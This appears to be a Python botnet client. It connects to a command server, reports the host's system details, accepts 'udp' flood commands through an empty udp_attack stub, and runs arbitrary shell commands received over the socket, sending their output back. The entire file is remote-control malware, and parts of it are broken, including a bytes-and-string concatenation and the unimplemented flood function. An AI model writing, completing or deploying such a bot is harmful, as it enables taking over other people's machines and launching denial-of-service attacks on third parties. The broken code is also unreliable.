# Modules
import socket, sys, os, platform, threading, subprocess
buffer_len = 1024

def GetInfo():
    infoSys = "[System]: " + platform.uname().system
    infoSys += ",[System Name]: " + platform.uname().node
    infoSys += ",[Kernel Release]: " + platform.uname().release
    infoSys += ",[OS Version]: " + platform.uname().version
    infoSys += ",[Arch]: " + platform.uname().machine
    infoSys += ",[Processor]: " + platform.uname().processor
    return infoSys

def udp_attack(ip, port, time):
    return ""


def connect(PORT):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("0.0.0.0", PORT))
    sock.send(f"[quantum_connect],{GetInfo()}".encode())
    while(True): 
        try:
            rec = sock.recv(1024).decode().strip().replace("\r\n", "")
            print(rec)
            if rec == "ping":
                sock.send("ping".encode())
            elif rec.startswith("udp"):
                arg = rec.split(" ")
                threading.Thread(target=udp_attack, args=(arg[1], arg[2], arg[3])).start()
                sock.send("[+] UDP Attack Sent: " + arg[1] + ":" + arg[2] + " for " + arg[3] + " seconds\r\n".encode())
            elif rec.startswith("sh"):
                arg = rec.split(" ")
                cmd = rec.replace(arg[0] + " ", "")
                Cmdresp = subprocess.check_output(cmd.split(" "))
                Cmdr = subprocess.getoutput(cmd)
                print(cmd + Cmdresp + Cmdr)
                sock.send(str(Cmdresp).encode("utf-8"))
                sock.send("ping".encode())

        except:
            break;


connect(int(sys.argv[1]))